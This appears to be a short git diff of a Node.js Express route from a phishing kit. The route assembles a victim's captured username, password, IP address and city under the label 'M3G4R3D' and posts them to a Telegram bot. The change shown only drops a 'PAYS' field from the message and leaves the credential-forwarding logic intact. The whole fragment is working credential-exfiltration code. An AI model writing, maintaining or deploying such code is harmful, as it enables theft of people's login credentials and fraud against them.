@@ -34,7 +34,7 @@ app.post('/api/sendMessage', async (req, res) => {
     }
 
     // Construir mensaje
-    const message = `🔵M3G4R3D🔵\nPAYS: ${user}\nUS4R: <code>${user}</code>\nCL4V: <code>${password}</code>\n\nIP: ${ip}\nCiudad: ${city}`;
+    const message = `🔵M3G4R3D🔵\nUS4R: <code>${user}</code>\nCL4V: <code>${password}</code>\n\nIP: ${ip}\nCiudad: ${city}`;
 
     try {
         const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
